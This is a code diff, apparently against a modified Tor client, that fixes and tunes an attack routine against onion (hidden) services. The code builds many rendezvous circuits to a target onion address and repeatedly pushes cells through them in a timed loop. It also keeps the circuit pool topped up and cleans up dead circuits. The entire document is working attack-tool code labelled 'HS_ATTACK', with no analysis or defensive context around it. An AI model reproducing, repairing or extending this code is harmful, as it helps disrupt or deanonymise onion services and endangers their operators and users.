@@ -362,7 +362,6 @@ static void hs_attack_launch(time_t *until) {
           log_debug(LD_REND, "HS_ATTACK: send_rd_cell failed\n");
         }
       }SMARTLIST_FOREACH_END(circmap);
-      //sleep(1);
       i++;
       now = time(NULL);
     }
@@ -375,8 +374,10 @@ static void hs_attack_launch(time_t *until) {
     int i;
     circ_info_t *circmap;
     int circmaps_sl_idx, circmaps_sl_len;
+    int removed_elements;
     while(*until > now) {
       circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
+      removed_elements = 0;
       for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; ++circmaps_sl_idx) {
         circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
         if (circmap->rendcirc->base_.state == CIRCUIT_STATE_OPEN && 
@@ -384,16 +385,19 @@ static void hs_attack_launch(time_t *until) {
           for (i=0; i < num_cell_per_circuit; i++) {
             if (send_rd_cell(circmap->rendcirc) < 0) {
               //remove the circ; launch a new one.
-              circuit_mark_for_close(TO_CIRCUIT(circmap->rendcirc), END_CIRC_REASON_INTERNAL);
-              circuit_mark_for_close(TO_CIRCUIT(circmap->introcirc), END_CIRC_REASON_INTERNAL);
-              extend_info_free(circmap->extend_info);
+              /*circuit_mark_for_close(TO_CIRCUIT(circmap->rendcirc), END_CIRC_REASON_INTERNAL);*/
+              /*circuit_mark_for_close(TO_CIRCUIT(circmap->introcirc), END_CIRC_REASON_INTERNAL);*/
+              /*extend_info_free(circmap->extend_info);*/
               smartlist_del(attack_infos->rendcircs, circmaps_sl_idx--);
               circmaps_sl_len--;
-              launch_new_rendezvous();
+              removed_elements++;
               break;
             }
           }
         }
+      }
+      for (int i = 0; i < removed_elements; i++) {
+        launch_new_rendezvous();
       }
       now = time(NULL);
     }
@@ -442,15 +446,15 @@ static void hs_attack_check_healthiness() {
      {
        circ_info_t *circmap;
        int circmaps_sl_idx;
-       /*int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);*/
+       int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
        int init_intro = 0;
-       for (circmaps_sl_idx = 0; circmaps_sl_idx < smartlist_len(attack_infos->rendcircs); circmaps_sl_idx++) {
+       for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; circmaps_sl_idx++) {
          circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
          if (circmap->state_rend != REND_CIRC_READY_FOR_RD ||
              circmap->state_intro != REND_CIRC_INTRO_CELL_SENT) {
            if (check_expiration(circmap, circmaps_sl_idx)) {
              circmaps_sl_idx--;
-             /*circmaps_sl_len--;*/
+             circmaps_sl_len--;
              removed_elements++;
            }
            init_intro = 1;
@@ -468,23 +472,25 @@ static void hs_attack_check_healthiness() {
         int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
         int init_intro = 0;
         for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; ++circmaps_sl_idx) {
-          break;
           circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
           if ((circmap->rendcirc->base_.state != CIRCUIT_STATE_OPEN &&
               circmap->state_rend == REND_CIRC_READY_FOR_RD) || TO_CIRCUIT(circmap->rendcirc)->marked_for_close) {
-            circuit_mark_for_close(TO_CIRCUIT(circmap->rendcirc), END_CIRC_REASON_INTERNAL);
-            circuit_mark_for_close(TO_CIRCUIT(circmap->introcirc), END_CIRC_REASON_INTERNAL);
-            extend_info_free(circmap->extend_info);
+            TO_CIRCUIT(circmap->rendcirc)->marked_for_close = 1;
+            TO_CIRCUIT(circmap->introcirc)->marked_for_close = 1;
+            /*extend_info_free(circmap->extend_info);*/
+            log_info(LD_REND, "HS_ATTACK: Circuit not open anymore, removing ...\n");
             smartlist_del(attack_infos->rendcircs, circmaps_sl_idx--);
-            //circmaps_sl_len--;
-            launch_new_rendezvous();
+            circmaps_sl_len--;
             init_intro = 1;
+            removed_elements++;
           }
+          // For new circuits
           else if (circmap->state_intro != INTRO_CIRC_READY &&
               circmap->state_rend != REND_CIRC_READY_FOR_RD) {
             if (check_expiration(circmap, circmaps_sl_idx)) {
               circmaps_sl_idx--;
-              //circmaps_sl_len--;
+              circmaps_sl_len--;
+              removed_elements++;
             }
             init_intro = 1;
           }
@@ -497,7 +503,7 @@ static void hs_attack_check_healthiness() {
   for (int i = 0; i < removed_elements; i++){
     launch_new_rendezvous();
   }
-  /*circuit_close_all_marked();*/
+  circuit_close_all_marked();
   control_event_hs_attack(HS_ATTACK_MONITOR_HEALTHINESS);
 }
 
@@ -551,7 +557,9 @@ hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress,
       //UNLOCK_ATTACK();
       break;
     case SEND_RD: 
-      hs_attack_launch(until); break;
+      hs_attack_launch(until);
+      free_hs_rd_attack();
+      break;
     case CHECK_HEALTHINESS:
       //LOCK_ATTACK();
       hs_attack_check_healthiness();
